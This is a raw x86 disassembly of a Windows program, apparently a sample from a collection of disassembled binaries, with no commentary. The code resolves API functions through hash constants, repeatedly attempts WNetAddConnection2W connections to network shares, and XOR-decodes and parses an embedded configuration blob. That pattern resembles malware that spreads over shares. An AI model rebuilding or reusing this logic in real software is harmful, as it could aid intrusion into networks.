lea edi [ esp + 0x1c ]
mov esi ebx
mov [ esp + 0x14 ] 0x6bb8ddd8
call sub_4015ac
lea eax [ esp + 0x10 ]
push eax
lea edi [ esp + 0x30 ]
mov [ esp + 0x14 ] 0x124a76f5
call sub_4015ac
lea eax [ esp + 0x10 ]
push eax
lea edi [ esp + 0x34 ]
mov [ esp + 0x14 ] 0x15289533
call sub_4015ac
lea eax [ esp + 0x10 ]
push eax
lea edi [ esp + 0x38 ]
mov [ esp + 0x14 ] 0x62358130
call sub_4015ac
lea eax [ esp + 0x10 ]
push eax
lea esi [ esp + 0x28 ]
mov ecx ebx
mov [ esp + 0x14 ] 0x7f4becad
call sub_40157f
lea eax [ esp + 0x10 ]
push eax
lea esi [ esp + 0x24 ]
mov ecx ebx
mov [ esp + 0x14 ] 0x69b8e0a0
call sub_40157f
mov esi [ lstrcpyW@IAT ]
push r--data
lea eax [ esp + 0x51c ]
push eax
call esi
push [ esp + 0x18 ]
mov ebx [ lstrcatW@IAT ]
lea eax [ esp + 0x51c ]
push eax
call ebx
push [ esp + 0x34 ]
lea eax [ esp + 0x51c ]
push eax
call ebx
push r--data
lea eax [ esp + 0x11c ]
push eax
call esi
lea eax [ esp + 0x10 ]
push eax
lea edi [ esp + 0x1c ]
lea esi [ esp + 0x3c ]
mov [ esp + 0x14 ] 0x61a0c61a
call sub_4015ac
push [ esp + 0x18 ]
lea eax [ esp + 0x11c ]
push eax
call ebx
mov esi [ ebp + 0x8 ]
push 0x8
pop ecx
push 0xffffffff
xor eax eax
lea edi [ esp + 0x98 ]
push esi
lea ebx [ esp + 0x9c ]
[ edi ]
call sub_40394f
push 0x8
pop ecx
mov [ esp + 0x10 ] eax
push 0xa
xor eax eax
lea edi [ esp + 0xd8 ]
push esi
lea ebx [ esp + 0xdc ]
[ edi ]
call sub_40394f
push eax
call [ Sleep@IAT ]
push 0x8
pop ecx
push 0xffffffff
xor eax eax
lea edi [ esp + 0xb8 ]
push esi
lea ebx [ esp + 0xbc ]
[ edi ]
call sub_40394f
push esi
mov edi eax
call sub_4054a4
inc [ rw-data ]
push edi
push [ esp + 0x14 ]
push [ rw-data ]
push eax
push edx
push 0x80051a85
lea eax [ esp + 0x330 ]
push r--data
push eax
call [ wsprintfW@IAT ]
mov ebx [ lstrcatW@IAT ]
add esp 0x20
lea eax [ esp + 0x318 ]
push eax
lea eax [ esp + 0x11c ]
push eax
call ebx
lea eax [ esp + 0x10 ]
push eax
lea edi [ esp + 0x1c ]
lea esi [ esp + 0x3c ]
mov [ esp + 0x14 ] 0x11bfc7eb
call sub_4015ac
push [ esp + 0x18 ]
lea eax [ esp + 0x11c ]
push eax
call ebx
push 0x6
xor eax eax
and [ esp + 0x14 ] eax
pop ecx
lea edi [ esp + 0x7c ]
[ edi ]
mov ax [ esp + 0x7c ]
mov [ esp + 0x118 ] ax
call sub_4046cc
lea eax [ esp + 0x118 ]
test eax eax
je r-xdata
add esi edi
cmp esi rw-data
jl r-xdata
mov [ esp + 0x17 ] 0x0
push 0x5
push eax
call sub_4047b2
mov esi eax
cmp esi 0xffffffff
je r-xdata
push 0x20
lea eax [ esp + 0x60 ]
push 0x0
push eax
call sub_4130d0
movzx eax [ esi ]
add esp 0xc
push 0x2
pop edi
push eax
xor ebx ebx
lea eax [ esp + 0x80 ]
push r--data
inc ebx
push eax
mov [ esp + 0x68 ] edi
mov [ esp + 0x6c ] ebx
mov [ esp + 0x70 ] 0x9
mov [ esp + 0x74 ] 0x7
call [ wsprintfW@IAT ]
and [ esp + 0x84 ] 0x0
add esp 0xc
push 0x4
push [ esp + 0x30 ]
lea eax [ esp + 0x84 ]
push [ esp + 0x38 ]
mov [ esp + 0x78 ] eax
lea eax [ esp + 0x524 ]
mov [ esp + 0x7c ] eax
lea eax [ esp + 0x68 ]
push eax
call [ WNetAddConnection2W@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x24 ]
imul eax eax 0x3e8
push eax
call [ Sleep@IAT ]
inc [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
cmp eax [ esp + 0x20 ]
jge r-xdata
cmp [ esp + 0x17 ] 0x0
je r-xdata
call sub_4046cc
cmp [ ebp + 0xc ] 0x0
je r-xdata
inc [ esp + 0x1c ]
mov eax [ esp + 0x1c ]
mov [ esp + 0x10 ] eax
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x2c ]
push eax
lea eax [ esp + 0xfc ]
push eax
push ecx
call sub_40729d
pop ecx
push eax
call sub_407203
mov [ esp + 0x924 ] 0x1
push eax
lea ebx [ esp + 0x3c ]
call sub_40b695
mov [ esp + 0x924 ] 0x0
lea eax [ esp + 0xf4 ]
push eax
call sub_40114f
mov eax [ esp + 0x40 ]
push 0xd
xor edx edx
pop ecx
div ecx
test eax eax
je r-xdata
mov esi rw-data
call sub_4046cc
push esi
call [ CloseHandle@IAT ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_404878
test eax eax
jne r-xdata
call sub_4046cc
push esi
call [ CloseHandle@IAT ]
mov [ esp + 0x17 ] bl
jmp r-xdata
push ebx
lea eax [ esp + 0x80 ]
push eax
call [ WNetCancelConnectionW@IAT ]
jmp r-xdata
sub_40d222
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
push [ ebp + 0xc ]
mov esi eax
mov edi ecx
call [ lstrlenA@IAT ]
mov ebx [ ebp + 0x8 ]
sub ebx eax
add ebx 0xfffffffd
mov [ ebp - 0xc ] eax
cmp esi ebx
jae r-xdata
xor al al
lea eax [ edi + esi ]
mov [ ebp - 0x8 ] eax
xor al al
push [ ebp - 0xc ]
mov eax [ ebp + 0xc ]
call sub_405c87
jmp r-xdata
add esi [ ebp - 0xc ]
mov [ ebp - 0x1 ] 0x0
mov cl [ esi + edi ]
inc esi
cmp cl 0x1
je r-xdata
inc esi
inc [ ebp - 0x8 ]
cmp esi ebx
jb r-xdata
test al al
jne r-xdata
mov edx [ ebp + 0x18 ]
test edx edx
je r-xdata
push 0x2
pop ebx
cmp cl bl
je r-xdata
call sub_4046cc
mov ecx [ ebp - 0x8 ]
test ecx ecx
je r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
mov ecx [ ebp + 0x14 ]
test ecx ecx
je r-xdata
mov edx [ ebp + 0x18 ]
test edx edx
je r-xdata
push 0x4
pop eax
cmp cl al
je r-xdata
mov al [ ebp - 0x1 ]
jmp r-xdata
mov [ ecx ] esi
mov [ edx ] 0x1
cmp [ edx ] 0x1
jl r-xdata
mov ecx [ ebp + 0x14 ]
test ecx ecx
je r-xdata
mov edx [ ebp + 0x18 ]
test edx edx
je r-xdata
cmp cl 0xfb
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x8 ]
dec eax
cmp esi eax
jg r-xdata
mov [ edx ] ebx
jmp r-xdata
cmp [ edx ] ebx
jb r-xdata
mov ecx [ ebp + 0x14 ]
test ecx ecx
je r-xdata
cmp cl 0xff
ja r-xdata
mov al [ edi + esi ]
mov [ ecx ] al
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
add eax 0xfffffffe
cmp esi eax
ja r-xdata
mov [ edx ] eax
jmp r-xdata
cmp [ edx ] eax
jb r-xdata
movzx eax [ esi + edi ]
mov edx [ ebp + 0x18 ]
add esi ebx
mov [ ebp - 0xc ] eax
test edx edx
je r-xdata
mov ax [ edi + esi ]
mov [ ecx ] ax
mov [ ebp - 0x1 ] 0x1
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
cmp esi ebx
ja r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov edi [ edi + esi ]
mov [ ecx ] edi
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
movzx eax [ ebp - 0xc ]
movzx ebx ax
mov eax [ edx ]
dec eax
cmp ebx eax
jg r-xdata
mov ecx [ ebp + 0x8 ]
sub ecx ebx
cmp esi ecx
jg r-xdata
push ebx
add edi esi
push edi
push [ ebp + 0x14 ]
call sub_413290
mov eax [ ebp + 0x14 ]
mov edx [ ebp + 0x18 ]
add esp 0xc
mov [ ebx + eax ] 0x0
mov [ ebp - 0x1 ] 0x1
sub_40d392
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41dcda
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xf98
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
push ebx
push esi
push edi
mov edi [ eax + 0x4 ]
xor ebx ebx
mov [ esp + 0x17 ] 0x1
mov [ esp + 0x20 ] ecx
mov [ esp + 0x38 ] edi
mov [ esp + 0x18 ] ebx
cmp edi ebx
jle r-xdata
mov ecx [ esp + 0xfa4 ]
mov al [ esp + 0x17 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
jmp r-xdata
mov esi 0x103
push esi
lea eax [ esp + 0x15d ]
push ebx
push eax
mov [ esp + 0x164 ] bl
call sub_4130d0
add esp 0xc
push esi
lea eax [ esp + 0x55 ]
push ebx
push eax
mov [ esp + 0x5c ] bl
call sub_4130d0
add esp 0xc
push esi
lea eax [ esp + 0x36d ]
push ebx
push eax
mov [ esp + 0x374 ] bl
call sub_4130d0
add esp 0xc
push esi
lea eax [ esp + 0x475 ]
push ebx
push eax
mov [ esp + 0x47c ] bl
call sub_4130d0
add esp 0xc
push esi
lea eax [ esp + 0x265 ]
push ebx
push eax
mov [ esp + 0x26c ] bl
call sub_4130d0
mov ecx [ esp + 0x2c ]
add esp 0xc
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x15c ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov eax [ esp + 0x24 ]
push r--data
inc esi
push edi
mov [ esp + 0x24 ] esi
call sub_40d222
add esp 0x14
test al al
je r-xdata
mov eax [ esp + 0x10 ]
add [ esp + 0x18 ] eax
push r--data
lea eax [ esp + 0x15c ]
push eax
mov [ esp + 0x24 ] ebx
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
push r--data
lea eax [ esp + 0x15c ]
push eax
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x20 ]
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x264 ]
push eax
lea eax [ esp + 0x24 ]
push eax
mov eax [ esp + 0x24 ]
push r--data
push edi
mov [ esp + 0x24 ] esi
call sub_40d222
mov ecx [ esp + 0x34 ]
add esp 0x14
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x474 ]
push eax
lea eax [ esp + 0x24 ]
push eax
mov eax [ esp + 0x24 ]
push r--data
push edi
mov [ esp + 0x24 ] esi
call sub_40d222
mov ecx [ esp + 0x34 ]
add esp 0x14
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x54 ]
push eax
lea eax [ esp + 0x24 ]
push eax
mov eax [ esp + 0x24 ]
push r--data
push edi
mov [ esp + 0x24 ] esi
call sub_40d222
add esp 0x14
test al al
je r-xdata
push r--data
lea eax [ esp + 0x15c ]
push eax
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x20 ]
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x264 ]
push eax
lea eax [ esp + 0x24 ]
push eax
mov eax [ esp + 0x24 ]
push r--data
push edi
mov [ esp + 0x24 ] esi
call sub_40d222
add esp 0x14
jmp r-xdata
mov esi [ MultiByteToWideChar@IAT ]
push 0x208
lea eax [ esp + 0xd9c ]
push eax
push 0xffffffff
lea eax [ esp + 0x164 ]
push eax
push ebx
mov edi 0xfde9
push edi
call esi
push 0x208
lea eax [ esp + 0x57c ]
push eax
push 0xffffffff
lea eax [ esp + 0x47c ]
push eax
push ebx
push edi
call esi
push 0x208
lea eax [ esp + 0x784 ]
push eax
push 0xffffffff
lea eax [ esp + 0x26c ]
push eax
push ebx
push edi
call esi
push 0x208
lea eax [ esp + 0x98c ]
push eax
push 0xffffffff
lea eax [ esp + 0x5c ]
push eax
push ebx
push edi
call esi
push 0x208
lea eax [ esp + 0xb94 ]
push eax
push 0xffffffff
lea eax [ esp + 0x374 ]
push eax
push ebx
push edi
call esi
lea esi [ esp + 0x24 ]
call sub_405d11
mov [ esp + 0xfac ] ebx
push ebx
lea eax [ esp + 0x38 ]
push eax
push 0x4
pop edi
mov eax edi
mov ecx esi
mov [ esp + 0x3c ] 0x77010101
call sub_4060be
push r--data
mov eax esi
push eax
call sub_4025f0
lea eax [ esp + 0xb90 ]
push eax
mov eax esi
push eax
call sub_4025f0
lea eax [ esp + 0x578 ]
push eax
mov eax esi
push eax
call sub_4025f0
lea eax [ esp + 0x780 ]
push eax
mov eax esi
push eax
call sub_4025f0
lea eax [ esp + 0x988 ]
push eax
mov eax esi
push eax
call sub_4025f0
push ebx
lea eax [ esp + 0x20 ]
push eax
mov eax edi
mov ecx esi
mov [ esp + 0x24 ] ebx
call sub_4060be
push ebx
lea eax [ esp + 0x14 ]
push eax
mov eax edi
mov ecx esi
mov [ esp + 0x18 ] ebx
call sub_4060be
push ebx
lea eax [ esp + 0x44 ]
push eax
mov eax edi
mov ecx esi
mov [ esp + 0x48 ] ebx
call sub_4060be
call [ GetACP@IAT ]
mov [ esp + 0x44 ] eax
push ebx
lea eax [ esp + 0x48 ]
push eax
mov eax edi
mov ecx esi
call sub_4060be
push ebx
lea eax [ esp + 0x50 ]
push eax
mov eax edi
mov ecx esi
mov [ esp + 0x54 ] 0x3
call sub_4060be
push ebx
lea eax [ esp + 0x4c ]
push eax
mov eax edi
mov ecx esi
mov [ esp + 0x50 ] ebx
call sub_4060be
lea eax [ esp + 0xd98 ]
push eax
mov eax esi
push eax
call sub_4025f0
mov eax [ esp + 0x28 ]
mov [ esp + 0x3c ] eax
lea eax [ esp + 0x3c ]
push eax
mov eax esi
call sub_406173
push [ esp + 0x28 ]
mov esi [ ebp + 0x8 ]
push ebx
push 0x64
push esi
call sub_403aef
push eax
push 0xff0f8211
push [ esp + 0x3c ]
push [ esp + 0x3c ]
call sub_40242d
test al al
je r-xdata
lea eax [ esp + 0x50 ]
push eax
lea eax [ esp + 0x36c ]
push eax
call [ lstrcpyA@IAT ]
push [ esp + 0x10 ]
lea eax [ esp + 0x54 ]
push eax
call sub_40d208
pop ecx
xor eax eax
pop ecx
cmp [ esp + 0x10 ] ebx
jle r-xdata
mov ecx [ esp + 0x20 ]
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x38 ]
push eax
lea eax [ esp + 0x24 ]
push eax
mov eax [ esp + 0x24 ]
push r--data
push edi
mov [ esp + 0x48 ] ebx
mov [ esp + 0x24 ] 0x4
call sub_40d222
add esp 0x14
test al al
je r-xdata
mov ecx [ esp + 0x20 ]
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x54 ]
push eax
lea eax [ esp + 0x24 ]
push eax
mov eax [ esp + 0x24 ]
push r--data
push edi
mov [ esp + 0x24 ] esi
call sub_40d222
add esp 0x14
test al al
je r-xdata
or [ esp + 0xfac ] 0xffffffff
lea esi [ esp + 0x24 ]
call sub_405f2c
xor al al
or [ esp + 0xfac ] 0xffffffff
lea esi [ esp + 0x24 ]
call sub_405f2c
mov al 0x1
jmp r-xdata
xor [ esp + eax + 0x368 ] 0xc3
inc eax
cmp eax [ esp + 0x10 ]
jl r-xdata
push [ esp + 0x34 ]
lea eax [ esp + 0x264 ]
push r--data
push eax
call [ wsprintfA@IAT ]
add esp 0xc
push [ esp + 0x10 ]
lea eax [ esp + 0x54 ]
push eax
call sub_40d208
pop ecx
pop ecx
mov edi eax
and [ esp + 0x17 ] al
mov eax [ esp + 0x38 ]
cmp [ esp + 0x18 ] eax
jl r-xdata
jmp r-xdata
sub_40d88d
sub esp 0x18
push ebx
push ebp
push esi
push edi
mov edi eax
mov esi [ edi + 0x1a ]
inc esi
mov ebp 0x6400000
cmp esi ebp
ja r-xdata
xor esi esi
xor ebx ebx
xor ebx ebx
cmp esi ebx
jne r-xdata
mov eax [ edi + 0x1a ]
inc eax
push eax
lea eax [ edi + 0x1e ]
push eax
push esi
call [ lstrcpynA@IAT ]
push ebx
push ebx
push 0xffffffff
push esi
push ebx
push 0xfde9
call [ MultiByteToWideChar@IAT ]
lea ebx [ eax + eax ]
mov [ esp + 0x10 ] eax
cmp ebx ebp
ja r-xdata
xor al al
jmp r-xdata
add esi 0x4
cmp [ rw-data ] ebx
jne r-xdata
xor esi esi
inc esi
xor ebx ebx
test ebx ebx
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x18
retn
push ebx
call [ SetLastError@IAT ]
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
cmp eax ebx
jne r-xdata
call sub_405c10
test al al
je r-xdata
push [ esp + 0x10 ]
push ebx
push 0xffffffff
push esi
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
push esi
call sub_405c44
mov eax [ edi + 0x10 ]
cdq
push 0x0
add eax 0xb6109100
push 0x989680
adc edx 0x2
push edx
push eax
call sub_419140
mov [ esp + 0x10 ] eax
mov eax edx
sar eax 0x1f
lea eax [ esp + 0x18 ]
push eax
lea eax [ esp + 0x14 ]
push eax
mov [ esp + 0x1c ] edx
call [ FileTimeToSystemTime@IAT ]
mov edi [ lstrlenW@IAT ]
push ebx
call edi
lea esi [ eax + eax + 0x800 ]
cmp esi ebp
ja r-xdata
push esi
add ebx 0x4
cmp [ rw-data ] 0x0
jne r-xdata
inc ebx
mov esi eax
jmp r-xdata
push ebx
xor esi esi
xor ebp ebp
cmp esi ebp
jne r-xdata
push 0x0
call [ SetLastError@IAT ]
push ebx
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
jne r-xdata
call sub_405c10
test al al
je r-xdata
cmp esi ebx
jne r-xdata
movzx eax [ esp + 0x22 ]
push eax
movzx eax [ esp + 0x24 ]
push eax
movzx eax [ esp + 0x20 ]
push eax
movzx eax [ esp + 0x26 ]
push eax
movzx eax [ esp + 0x2e ]
push eax
push r--data
push esi
call [ wsprintfW@IAT ]
mov ebp [ lstrcatW@IAT ]
add esp 0x1c
push ebx
push esi
call ebp
push r--data
push esi
call ebp
push esi
call edi
lea edi [ eax + eax ]
mov eax [ esp + 0x2c ]
push esi
call sub_406173
push ebx
call sub_405c44
push esi
call sub_405c44
mov al 0x1
push ebx
jmp r-xdata
add esi 0x4
cmp [ rw-data ] ebp
jne r-xdata
xor esi esi
inc esi
mov ebx eax
jmp r-xdata
push eax
jmp r-xdata
call sub_405c44
jmp r-xdata
push ebp
call [ SetLastError@IAT ]
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
cmp eax ebp
jne r-xdata
call sub_405c10
test al al
je r-xdata
test ebx ebx
jne r-xdata
call [ ExitProcess@IAT ]
mov esi eax
jmp r-xdata
push ebp
jmp r-xdata
test esi esi
jne r-xdata
sub_40da82
push ecx
push ecx
push ebx
push ebp
xor ebx ebx
push esi
push edi
cmp [ esp + 0x1c ] ebx
je r-xdata
xor al al
cmp [ esp + 0x20 ] ebx
je r-xdata
mov esi [ MultiByteToWideChar@IAT ]
push ebx
push ebx
push 0xffffffff
push [ esp + 0x28 ]
mov ebp 0xfde9
push ebx
push ebp
call esi
lea edi [ eax + eax ]
mov [ esp + 0x14 ] eax
cmp edi 0x6400000
ja r-xdata
mov [ esp + 0x10 ] ebx
cmp edi ebx
jne r-xdata
push [ esp + 0x14 ]
push [ esp + 0x14 ]
push 0xffffffff
push [ esp + 0x28 ]
push ebx
push ebp
call esi
push ebx
push ebx
push 0xffffffff
push [ esp + 0x2c ]
push ebx
push ebp
call esi
lea edi [ eax + eax ]
mov [ esp + 0x14 ] eax
cmp edi 0x6400000
ja r-xdata
add edi 0x4
cmp [ rw-data ] ebx
jne r-xdata
xor edi edi
inc edi
mov [ esp + 0x1c ] ebx
cmp edi ebx
jne r-xdata
push ebx
call [ SetLastError@IAT ]
push edi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
cmp eax ebx
jne r-xdata
call sub_405c10
cmp al bl
je r-xdata
push [ esp + 0x14 ]
push edi
push 0xffffffff
push [ esp + 0x2c ]
push ebx
push ebp
call esi
mov ebx [ esp + 0x10 ]
mov esi [ lstrcmpiW@IAT ]
push r--data
push ebx
call esi
test eax eax
jne r-xdata
push [ esp + 0x10 ]
call sub_405c44
add edi 0x4
cmp [ rw-data ] ebx
jne r-xdata
xor edi edi
inc edi
mov [ esp + 0x10 ] eax
jmp r-xdata
push ebx
call [ ExitProcess@IAT ]
push r--data
push ebx
call esi
test eax eax
jne r-xdata
push edi
call [ lstrlenW@IAT ]
push 0x122e7eca
jmp r-xdata
push ebx
call [ SetLastError@IAT ]
push edi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
call sub_405c10
cmp al bl
je r-xdata
cmp [ esp + 0x10 ] ebx
je r-xdata
push r--data
push ebx
call esi
test eax eax
jne r-xdata
push edi
call [ lstrlenW@IAT ]
push 0x5278b0f
jmp r-xdata
mov ecx edi
mov edi [ esp + 0x28 ]
call sub_4011e8
mov [ esp + 0x1c ] eax
jmp r-xdata
push [ esp + 0x10 ]
call sub_405c44
push [ esp + 0x1c ]
call sub_405c44
mov al 0x1
jmp r-xdata
push edi
call [ lstrlenW@IAT ]
push 0x1d357bc2
pop edi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn
mov edi [ esp + 0x1c ]
cmp edi ebx
jne r-xdata
sub_40dc23
mov eax sub_41dcc5
call sub_4198ec
sub esp 0x70
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ eax ]
push esi
push edi
lea esi [ ebp - 0x38 ]
mov [ ebp - 0x11 ] 0x1
mov [ ebp - 0x28 ] ebx
call sub_405d11
and [ ebp - 0x4 ] 0x0
push rw-data
push ebx
call [ lstrcmpiA@IAT ]
test eax eax
je r-xdata
mov eax [ ebx + 0x20 ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea esi [ ebp - 0x38 ]
call sub_405f2c
xor al al
jmp r-xdata
cmp [ ebp - 0x34 ] 0x0
jle r-xdata
lea edi [ eax + ebx ]
cmp [ edi ] 0x43decade
mov eax [ edi + 0x4 ]
mov [ ebp - 0x24 ] edi
mov [ ebp - 0x20 ] eax
jne r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
or [ ebp - 0x4 ] 0xffffffff
lea esi [ ebp - 0x38 ]
call sub_405f2c
mov al [ ebp - 0x11 ]
push [ ebp - 0x34 ]
mov esi [ ebp + 0x8 ]
push 0x0
push 0x1
push esi
call sub_403aef
push eax
push 0x80c61103
push [ ebp - 0x34 ]
push [ ebp - 0x38 ]
call sub_40242d
and [ ebp - 0x11 ] al
lea eax [ ebp - 0x7c ]
push eax
call sub_401108
mov [ ebp - 0x4 ] 0x1
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
cmp [ edi + 0x10 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x74 ]
push 0xd
xor edx edx
pop ecx
div ecx
test eax eax
je r-xdata
lea esi [ ebp - 0x48 ]
call sub_405d11
mov [ ebp - 0x4 ] 0x2
xor eax eax
mov esi r--data
cmp eax esi
je r-xdata
add eax ebx
cmp [ eax ] 0x53decade
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x1c ] ecx
jne r-xdata
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x7c ]
push eax
call sub_40114f
cmp [ ebp - 0x20 ] 0x0
je r-xdata
lea esi [ ebp - 0x58 ]
call sub_405d11
mov [ ebp - 0x4 ] 0x3
mov ecx esi
lea edx [ ebp - 0x7c ]
call sub_40120a
mov esi [ ebp - 0x54 ]
xor edi edi
push edi
lea eax [ ebp + 0xc ]
push eax
push 0x4
pop eax
lea ecx [ ebp - 0x38 ]
mov [ ebp + 0xc ] esi
call sub_4060be
push edi
push [ ebp - 0x58 ]
mov eax esi
lea ecx [ ebp - 0x38 ]
call sub_4060be
cmp [ ebp - 0x34 ] 0xa000
jle r-xdata
mov esi [ edi + 0x10 ]
jmp r-xdata
push esi
call [ lstrlenW@IAT ]
push 0x1
add eax eax
push esi
lea ecx [ ebp - 0x48 ]
call sub_4060be
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x7c ]
push eax
call sub_40114f
jmp r-xdata
lea esi [ eax + 0x10 ]
mov al [ esi ]
test al al
je r-xdata
mov eax [ ebp - 0x20 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
lea esi [ ebp - 0x58 ]
call sub_405f2c
push [ ebp - 0x34 ]
mov esi [ ebp + 0x8 ]
push edi
push 0x1
push esi
call sub_403aef
push eax
push 0x80c61103
push [ ebp - 0x34 ]
push [ ebp - 0x38 ]
call sub_40242d
and [ ebp - 0x11 ] al
lea esi [ ebp - 0x38 ]
call sub_405f3e
test esi esi
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
and [ ebp + 0xc ] 0x0
movzx edi al
lea ebx [ edi + 0x1 ]
inc esi
mov [ ebp - 0x18 ] ebx
cmp ebx 0x6400000
ja r-xdata
lea eax [ esi + ebx ]
cmp [ eax ] 0x45decade
mov esi [ eax + 0x8 ]
jne r-xdata
push [ ebp - 0x48 ]
call [ lstrlenW@IAT ]
mov ecx [ ebp - 0x48 ]
push 0x7a209505
lea edi [ ebp - 0x7c ]
call sub_4011e8
mov [ ebp - 0x4 ] 0x1
lea esi [ ebp - 0x48 ]
call sub_405f2c
mov eax [ ebp - 0x1c ]
and [ ebp - 0x18 ] 0x0
test ebx ebx
jne r-xdata
mov [ ebp - 0x4 ] 0x1
lea esi [ ebp - 0x48 ]
call sub_405f2c
lea ecx [ ebp - 0x48 ]
push ecx
call sub_40d88d
pop ecx
push ebx
push esi
push [ ebp - 0x18 ]
call [ lstrcpynA@IAT ]
add esi edi
mov al [ esi ]
inc esi
cmp al 0x1
jne r-xdata
add [ ebp - 0x18 ] 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp - 0x18 ] 0x1
cmp al 0x2
jne r-xdata
inc esi
jmp r-xdata
push 0x0
call [ SetLastError@IAT ]
push [ ebp - 0x18 ]
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
call sub_405c10
test al al
je r-xdata
cmp al 0x4
jne r-xdata
add esi 0x2
jmp r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ ebp + 0xc ]
push [ ebp - 0x18 ]
call sub_40da82
add esp 0xc
push [ ebp - 0x18 ]
call sub_405c44
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x0
call [ ExitProcess@IAT ]
mov [ ebp - 0x18 ] eax
jmp r-xdata
cmp al 0xfe
je r-xdata
add esi 0x4
jmp r-xdata
mov al [ esi ]
test al al
jne r-xdata
push [ ebp + 0xc ]
call sub_405c44
cmp [ ebp - 0x18 ] 0x0
je r-xdata
movzx eax [ esi ]
lea esi [ esi + eax + 0x2 ]
cmp al 0xfc
je r-xdata
mov edi [ ebp - 0x24 ]
mov ebx [ ebp - 0x28 ]
cmp al 0xfd
je r-xdata
movzx ebx [ esi ]
lea edi [ ebx + 0x1 ]
add esi 0x2
mov [ ebp + 0xc ] edi
cmp edi 0x6400000
ja r-xdata
cmp al 0xff
jne r-xdata
and [ ebp + 0xc ] 0x0
test edi edi
jne r-xdata
add esi ebx
jmp r-xdata
push edi
push esi
push [ ebp + 0xc ]
call [ lstrcpynA@IAT ]
add [ ebp + 0xc ] 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov [ ebp + 0xc ] 0x1
push 0x0
call [ SetLastError@IAT ]
push [ ebp + 0xc ]
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
call sub_405c10
test al al
jne r-xdata
mov [ ebp + 0xc ] eax
jmp r-xdata
and [ ebp + 0xc ] 0x0
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
sub_40dfd9
mov eax sub_41dc6f
call sub_4198ec
sub esp 0x18
push ebx
push esi
xor esi esi
push edi
cmp [ ebp + 0xc ] esi
je r-xdata
xor al al
push esi
push [ ebp + 0xc ]
call sub_4047b2
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
push esi
push ebx
call [ GetFileSize@IAT ]
mov edi eax
cmp edi esi
je r-xdata
push ebx
call [ CloseHandle@IAT ]
cmp edi 0xffffffff
je r-xdata
push 0x1
push edi
lea esi [ ebp - 0x20 ]
call sub_405d65
xor esi esi
mov [ ebp - 0x4 ] esi
cmp edi esi
jbe r-xdata
push ebx
call [ CloseHandle@IAT ]
lea eax [ ebp - 0x20 ]
push eax
push [ ebp + 0x8 ]
call sub_40d392
mov bl al
lea eax [ ebp - 0x20 ]
push eax
push [ ebp + 0x8 ]
and bl 0x1
call sub_40dc23
and al bl
add esp 0x10
mov [ ebp + 0xf ] al
or [ ebp - 0x4 ] 0xffffffff
lea esi [ ebp - 0x20 ]
call sub_405f2c
mov al [ ebp + 0xf ]
jmp r-xdata
mov eax edi
sub eax esi
push eax
mov eax [ ebp - 0x20 ]
add eax esi
push eax
push ebx
call sub_404842
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
add esi eax
cmp esi edi
jb r-xdata
sub_40e09f
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax 0x1450
call sub_419050
push ebx
push esi
push [ ebp + 0xc ]
lea eax [ esp + 0xc ]
push eax
call [ lstrcpyW@IAT ]
mov esi [ ebp + 0x10 ]
